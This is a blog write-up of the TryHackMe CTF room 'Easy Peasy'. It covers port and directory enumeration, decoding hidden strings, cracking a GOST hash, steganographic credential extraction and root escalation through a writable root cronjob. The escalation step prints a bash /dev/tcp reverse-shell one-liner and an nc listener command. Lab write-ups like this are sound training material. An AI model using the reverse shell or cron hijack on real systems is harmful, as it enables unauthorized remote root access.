<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="icon" type="image/svg+xml" href="/favicon.svg"/><link rel="icon" type="image/png" href="/favicon.png"/><link rel="icon" type="image/x-icon" href="/favicon.ico"/><title>/dev/blog - TryHackMe - Easy Peasy</title><meta name="description" content="Writeup for the TryHackMe room Easy Peasy, a CTF like vulnerable machine."/><meta name="next-head-count" content="7"/><script id="dark-theme" data-nscript="beforeInteractive">if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')&&window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}</script><link rel="preload" href="/_next/static/css/5fc30b497c9bed6d.css" as="style"/><link rel="stylesheet" href="/_next/static/css/5fc30b497c9bed6d.css" data-n-g=""/><link rel="preload" href="/_next/static/css/2a1840b1c557e13c.css" as="style"/><link rel="stylesheet" href="/_next/static/css/2a1840b1c557e13c.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-2751f6424e24f776.js" defer=""></script><script src="/_next/static/chunks/framework-2c79e2a64abdb08b.js" defer=""></script><script src="/_next/static/chunks/main-f11614d8aa7ee555.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4751e1abc30929ff.js" defer=""></script><script src="/_next/static/chunks/424-7590959e48df0588.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bpath%5D-22b89921374303d8.js" defer=""></script><script src="/_next/static/AjqjDhysJOZHGgxWFoFmG/_buildManifest.js" defer=""></script><script src="/_next/static/AjqjDhysJOZHGgxWFoFmG/_ssgManifest.js" defer=""></script></head><body class="bg-primary-50 dark:bg-primary-900"><div id="__next"><header class="flex flex-row items-baseline justify-between gap-4 p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><nav class="flex flex-grow flex-row flex-wrap gap-y-4"><a title="Home page" class="mr-8" href="/"><h1 class=" text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl">/dev/blog</h1></a><ul class="flex flex-grow flex-row items-end justify-start gap-8"><li><a title="Posts" href="/posts"><span class="text-xl md:text-2xl text-primary-900 dark:text-primary-50 underline font-bold">Posts</span></a></li><li><a title="Notes" href="/notes"><span class="text-xl md:text-2xl text-primary-900 dark:text-primary-50  font-bold">Notes</span></a></li></ul></nav><div><button class="rounded border-t-2 border-l-2 border-r-4 border-b-4  border-primary-900 px-4 py-2 text-sm font-medium text-primary-900  hover:bg-primary-100 active:translate-y-0.5 dark:border-primary-50 dark:text-primary-50 dark:hover:bg-primary-800 "><span class="text-sm sm:text-base xl:text-lg text-primary-900 dark:text-primary-50 font-semibold">Auto</span></button></div></header><main class="flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><article class="flex max-w-full grow flex-col justify-self-start"><h1 class="mb-4 text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl"><span>TryHackMe - Easy Peasy</span></h1><blockquote><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The room link can be found at</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://tryhackme.com/room/easypeasyctf"><span>TryHackMe - Easy Peasy</span></a></p></blockquote><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Enumeration</span></h2><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>First we scan for open ports and services</span></p><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Nmap</span></h3><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We use nmap with some default arguments.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>sudo nmap -sV -sC -oA nmap/first $IP
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>It will return.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>From the first scan we can see that port </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">80</code><span> is open with </span><strong><span>nginx</span></strong><span> version</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">1.16.1</code></p><h4 class="mb-4 text-primary-900 dark:text-primary-50 text-xl font-semibold tracking-tight sm:text-2xl md:text-3xl"><span>All ports</span></h4><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>So let</span><span>’</span><span>s retry for all ports </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">-p-</code><span> in the background, using </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">-v</code><span> to increase</span>
<span>the verbosity and removing the scripts </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">-sC</code><span> and version </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">-sV</code><span> parameters.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>sudo nmap -v -p- -oA nmap/all $IP
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>This returns three ports open</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Let</span><span>’</span><span>s try to gather more information from those ports, scanning only those</span>
<span>specifically.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>sudo nmap -sC -sV -oA nmap/ports -p 80,65524,6498 $IP
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The output is the following</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>So summing up we have:</span></p><ol start="1" class="mb-4 ml-6 text-primary-900 dark:text-primary-50 text-sm sm:text-base xl:text-lg list-decimal"><li class="mb-2"><span>HTTP port 80 with nginx</span></li><li class="mb-2"><span>SSH port 6498 with OpenSSH</span></li><li class="mb-2"><span>HTTP port 65524 with Apache</span></li></ol><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Gobuster</span></h3><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>While scanning for other open ports let</span><span>’</span><span>s start </span><strong><span>gobuster</span></strong><span> to enumerate</span>
<span>directories on http port </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">80</code><span>. We will use the</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt"><span>Seclist big</span></a>
<span>wordlist.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>gobuster dir -o gobuster/nginx -w big.txt -u http://$IP/
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Gobuster finds an </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">hidden</code><span> directory.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:50:37 Starting gobuster
===============================================================
/hidden (Status: 301)
/robots.txt (Status: 200)
===============================================================
2020/08/10 13:54:18 Finished
===============================================================
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Let</span><span>’</span><span>s also scan the Apache server.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>gobuster dir -o gobuster/apache -w big.txt -u http://$IP:65524/
</span></code></pre><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP:65524/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:54:08 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/10 13:57:18 Finished
===============================================================
</span></code></pre><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Compromising</span></h2><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The second fase is a bit more confusing and the directions to find the flags</span>
<span>aren</span><span>’</span><span>t clear, but the access on the box is and privilege escalation is straight</span>
<span>forward.</span></p><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Flag 1</span></h3><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Futher enumerating the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">hidden</code><span> directory with gobuster we find another</span>
<span>directory called </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">wathever</code><span>.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>gobuster dir -o gobuster/hidden -w big.txt -u http://$IP/hidden/
</span></code></pre><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/hidden/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 14:13:44 Starting gobuster
===============================================================
/whatever (Status: 301)
===============================================================
2020/08/10 14:16:48 Finished
===============================================================
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Viewing the source code of the page there is an hidden </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">p</code><span> with a </span><strong><span>base64</span></strong>
<span>encoded string.</span></p><pre class="language-html mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>&lt;p hidden&gt;Z____________________Q==&lt;/p&gt;
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Decoding it we can find the first flag.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>echo Z____________________Q== | base64 -d

flag{__________}
</span></code></pre><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Flag 2</span></h3><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Using gobuster we have found </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">robots.txt</code><span> in the Apache server which shous us</span>
<strong><span>User-Agent</span></strong><span>.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a______________________________0
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The solution wasn</span><span>’</span><span>t so good. You have to find the solution online in some</span>
<span>obscure site searching for the hash :thinking:</span><span>…</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>flag{______________}
</span></code></pre><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Flag 3</span></h3><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>On the Apache home page we can find the third flag.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>Fl4g 3 : flag{________________________________}
</span></code></pre><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>User Flag</span></h3><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>On the Apache main page in the source we can see an hidden </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">p</code><span> again.</span></p><pre class="language-html mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>&lt;p hidden&gt;its encoded with ba....:O______________________u&lt;/p&gt;
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Since it is encoded with a base we open</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://gchq.github.io/CyberChef/"><span>Chyberchef</span></a><span> and try out a bunch of</span>
<span>encodings.</span></p><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>With </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">base62</code><span> we can find something that looks like an hidden directory.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>/n0th1ng3ls3m4tt3r
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>On this page we find a long string and an image.</span></p><pre class="language-html mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>&lt;p&gt;9______________________________________________________________1&lt;/p&gt;
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The hint tell us that it</span><span>’</span><span>s GHOST, so we use </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">hashcat</code><span> and the wordlist that was</span>
<span>provided to crack it.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>hashcat -a 0 -m 6900 hash.txt easypeasy.txt
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>With a bit of guessing we can use </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">steghide</code><span> on the image to extract some data.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The output are user and password information, the password is encoded in</span>
<span>binary.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>username:b____g
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Using Cyberchef we can get the credentials.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>username: b____g
password: i__________________________y
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Those are the credentials for the SSH. So when you access you can find the user</span>
<span>flag.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a______________y}
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Which is a </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">rot13</code><span> of </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">flag{________________}</code><span>.</span></p><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Root Flag</span></h3><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Uploading</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"><span>Linpeas</span></a>
<span>on the box we can find a cronjob that is run as root and execute a script</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">/var/www/.mysecretcronjob.sh</code><span>.</span></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We can put a reverse shell in the script to gain root access on the box.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>bash -i &gt;&amp; /dev/tcp/$USER_IP/9000 0&gt;&amp;1
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Open a listener and wait for the job to fire.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>nc -lvnp 9000
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The root flag is in a file </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">/root/.root.txt</code></p><pre class="language-plaintext mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>flag{________________________________}
</span></code></pre></article></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"TryHackMe - Easy Peasy","description":"Writeup for the TryHackMe room Easy Peasy, a CTF like vulnerable machine.","tags":["CTF","THM"],"date":"2020-08-06","draft":false,"language":null,"content":[{"Start":{"Heading":["H1",null,[]]}},{"Text":"TryHackMe - Easy Peasy"},{"End":{"Heading":["H1",null,[]]}},{"Start":"BlockQuote"},{"Start":"Paragraph"},{"Text":"The room link can be found at"},"SoftBreak",{"Start":{"Link":["Inline","https://tryhackme.com/room/easypeasyctf",""]}},{"Text":"TryHackMe - Easy Peasy"},{"End":{"Link":["Inline","https://tryhackme.com/room/easypeasyctf",""]}},{"End":"Paragraph"},{"End":"BlockQuote"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Enumeration"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"First we scan for open ports and services"},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Nmap"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"We use nmap with some default arguments."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"sudo nmap -sV -sC -oA nmap/first $IP\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"It will return."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"PORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.16.1\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: nginx/1.16.1\n|_http-title: Welcome to nginx!\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"From the first scan we can see that port "},{"Code":"80"},{"Text":" is open with "},{"Start":"Strong"},{"Text":"nginx"},{"End":"Strong"},{"Text":" version"},"SoftBreak",{"Code":"1.16.1"},{"End":"Paragraph"},{"Start":{"Heading":["H4",null,[]]}},{"Text":"All ports"},{"End":{"Heading":["H4",null,[]]}},{"Start":"Paragraph"},{"Text":"So let"},{"Text":"’"},{"Text":"s retry for all ports "},{"Code":"-p-"},{"Text":" in the background, using "},{"Code":"-v"},{"Text":" to increase"},"SoftBreak",{"Text":"the verbosity and removing the scripts "},{"Code":"-sC"},{"Text":" and version "},{"Code":"-sV"},{"Text":" parameters."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"sudo nmap -v -p- -oA nmap/all $IP\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"This returns three ports open"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"PORT      STATE SERVICE\n80/tcp    open  http\n6498/tcp  open  unknown\n65524/tcp open  unknown\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Let"},{"Text":"’"},{"Text":"s try to gather more information from those ports, scanning only those"},"SoftBreak",{"Text":"specifically."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"sudo nmap -sC -sV -oA nmap/ports -p 80,65524,6498 $IP\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"The output is the following"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"PORT      STATE SERVICE VERSION\n80/tcp    open  http    nginx 1.16.1\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: nginx/1.16.1\n|_http-title: Welcome to nginx!\n6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)\n|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)\n|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)\n65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: Apache/2.4.43 (Ubuntu)\n|_http-title: Apache2 Debian Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"So summing up we have:"},{"End":"Paragraph"},{"Start":{"List":1}},{"Start":"Item"},{"Text":"HTTP port 80 with nginx"},{"End":"Item"},{"Start":"Item"},{"Text":"SSH port 6498 with OpenSSH"},{"End":"Item"},{"Start":"Item"},{"Text":"HTTP port 65524 with Apache"},{"End":"Item"},{"End":{"List":1}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Gobuster"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"While scanning for other open ports let"},{"Text":"’"},{"Text":"s start "},{"Start":"Strong"},{"Text":"gobuster"},{"End":"Strong"},{"Text":" to enumerate"},"SoftBreak",{"Text":"directories on http port "},{"Code":"80"},{"Text":". We will use the"},"SoftBreak",{"Start":{"Link":["Inline","https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt",""]}},{"Text":"Seclist big"},{"End":{"Link":["Inline","https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt",""]}},"SoftBreak",{"Text":"wordlist."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"gobuster dir -o gobuster/nginx -w big.txt -u http://$IP/\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Gobuster finds an "},{"Code":"hidden"},{"Text":" directory."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://$IP/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/08/10 13:50:37 Starting gobuster\n===============================================================\n/hidden (Status: 301)\n/robots.txt (Status: 200)\n===============================================================\n2020/08/10 13:54:18 Finished\n===============================================================\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Let"},{"Text":"’"},{"Text":"s also scan the Apache server."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"gobuster dir -o gobuster/apache -w big.txt -u http://$IP:65524/\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://$IP:65524/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/08/10 13:54:08 Starting gobuster\n===============================================================\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/robots.txt (Status: 200)\n/server-status (Status: 403)\n===============================================================\n2020/08/10 13:57:18 Finished\n===============================================================\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Compromising"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"The second fase is a bit more confusing and the directions to find the flags"},"SoftBreak",{"Text":"aren"},{"Text":"’"},{"Text":"t clear, but the access on the box is and privilege escalation is straight"},"SoftBreak",{"Text":"forward."},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Flag 1"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"Futher enumerating the "},{"Code":"hidden"},{"Text":" directory 